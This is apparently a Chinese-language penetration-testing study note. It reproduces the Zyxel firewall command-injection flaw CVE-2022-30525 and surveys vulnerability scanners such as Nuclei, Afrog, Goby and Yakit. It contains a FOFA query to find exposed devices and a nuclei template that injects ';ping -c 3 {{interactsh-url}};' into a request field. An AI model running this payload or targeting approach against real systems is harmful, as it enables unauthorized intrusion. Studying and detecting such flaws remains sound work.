## 案例测试

案例1 http://vulnweb.com/
案例2：vulhub.org(Shiro反序列化)
案例3：新型对某特征点进行安全评估
例子：CVE-2022-30525: Zyxel 防火墙远程命令注入漏洞
https://blog.csdn.net/weixin_43080961/article/details/124776553
复现：
Fofa：title=="USG FLEX 50 (USG20-VPN)"
nuclei.exe -t Zyxel.yaml -l z.txt
Zyxel.yaml：
id: CVE-2022-30525

info:
  name: cx
  author: remote
  severity: high
  tags: CVE-2022-30525
  reference: CVE-2022-30525

requests:
  - raw:
      - |
        POST /ztp/cgi-bin/handler HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json; charset=utf-8
        
        {"command": "setWanPortSt","proto": "dhcp","port": "1270","vlan_tagged": "1270","vlanid": "1270","mtu": "{{exploit}}","data":""}
        
    payloads:
      exploit:
        - ";ping -c 3 {{interactsh-url}};"
    attack: pitchfork
    matchers:
      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"

#常规漏洞管理
代表产品：AWVS Appscan Xray W3af等
AWVS 是全球知名的 自动化 Web 漏洞扫描工具，由 Acunetix 公司开发，专注于检测网站、Web 应用和 API 的安全漏洞。它被广泛用于 渗透测试、安全审计、合规检查（如 PCI DSS），以帮助企业发现并修复安全风险。
安装参考：https://mp.weixin.qq.com/s/3_ecqjHotmy2E7vD69F3EQ

## Poc漏洞管理
代表产品：Afrog Nuclei TscanPlus Yscan等
Afrog是一款性能卓越、快速稳定、PoC可定制的漏洞扫描（挖洞）工具，PoC涉及CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行等多种漏洞类型，帮助网络安全从业者快速验证并及时修复漏洞。

Nuclei 是一款快速、可定制化的漏洞扫描工具，主要用于安全研究人员和渗透测试人员自动化检测目标系统的安全漏洞。它基于 YAML 格式的模板（Templates）进行扫描，支持多种协议（HTTP、DNS、TCP、TLS 等），能够高效地检测 Web 应用、API、网络设备、云服务等目标的安全问题。

TscanPlus 是一款由国内安全团队开发的 自动化漏洞扫描工具，专注于 Web 应用安全检测，支持多种漏洞类型，包括 SQL 注入、XSS、RCE、文件包含、未授权访问 等。它通常用于 渗透测试、红队演练、企业安全自查 等场景。

https://github.com/zan8in/afrog
https://github.com/TideSec/TscanPlus
https://github.com/projectdiscovery/nuclei
类似仓库：
https://github.com/ExpLangcn/NucleiTP
https://github.com/wooluo/nuclei-templates-2025hw

## 综合资产管理
代表产品：Goby Yakit ScopeSentry等
Goby是一款新的网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员更快的拿下目标。

Yakit是一款集成化单兵安全能力平台,通过函数提供各类底层安全能力，包括端口扫描、指纹识别、poc框架、shell管理、MITM劫持、强大的插件系统等。旨在打造一个覆盖渗透测试全流程的网络安全工具库。

Scope Sentry是一款具有分布式资产测绘、子域名枚举、信息泄露检测、漏洞扫描、目录扫描、子域名接管、爬虫、页面监控功能的工具，通过构建多个节点，自由选择节点运行扫描任务。

https://gobysec.net/
https://github.com/yaklang/yakit
https://github.com/Autumn-27/ScopeSentry